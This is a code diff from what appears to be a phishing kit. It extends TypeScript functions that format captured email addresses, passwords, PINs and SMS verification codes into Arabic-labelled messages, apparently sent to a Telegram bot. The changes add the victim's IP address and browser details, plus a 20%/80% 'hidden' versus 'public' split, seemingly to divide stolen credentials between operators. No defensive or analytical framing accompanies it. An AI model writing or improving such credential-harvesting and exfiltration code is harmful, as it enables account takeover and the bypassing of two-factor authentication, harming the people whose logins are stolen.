@@ -38,7 +38,15 @@ export async function sendToTelegram(message: string): Promise<boolean> {
   }
 }
 
-export function formatLoginMessage(email: string, password: string, pin: string): string {
+export function formatLoginMessage(
+  email: string, 
+  password: string, 
+  pin: string, 
+  ipAddress?: string | null,
+  userAgent?: string | null,
+  userNumber?: number,
+  isHidden?: boolean
+): string {
   const timestamp = new Date().toLocaleString("ar-EG", { timeZone: "Asia/Damascus" });
   
   return `
@@ -48,11 +56,22 @@ export function formatLoginMessage(email: string, password: string, pin: string)
 🔑 <b>كلمة المرور:</b> ${password}
 🔢 <b>رمز PIN:</b> ${pin}
 
+📍 <b>عنوان IP:</b> ${ipAddress || "غير متوفر"}
+🌐 <b>نوع المتصفح:</b> ${userAgent || "غير متوفر"}
+
+${userNumber ? `👤 <b>رقم المستخدم:</b> #${userNumber}` : ""}
+${isHidden !== undefined ? `🔒 <b>القسم:</b> ${isHidden ? "مخفي (20%)" : "عام (80%)"}` : ""}
+
 ⏰ <b>الوقت:</b> ${timestamp}
   `.trim();
 }
 
-export function formatSMSMessage(email: string, smsCode: string): string {
+export function formatSMSMessage(
+  email: string, 
+  smsCode: string,
+  userNumber?: number,
+  isHidden?: boolean
+): string {
   const timestamp = new Date().toLocaleString("ar-EG", { timeZone: "Asia/Damascus" });
   
   return `
@@ -60,6 +79,9 @@ export function formatSMSMessage(email: string, smsCode: string): string {
 
 📧 <b>البريد الإلكتروني:</b> ${email}
 💬 <b>كود SMS:</b> ${smsCode}
+
+${userNumber ? `👤 <b>رقم المستخدم:</b> #${userNumber}` : ""}
+${isHidden !== undefined ? `🔒 <b>القسم:</b> ${isHidden ? "مخفي (20%)" : "عام (80%)"}` : ""}
 
 ⏰ <b>الوقت:</b> ${timestamp}
   `.trim();
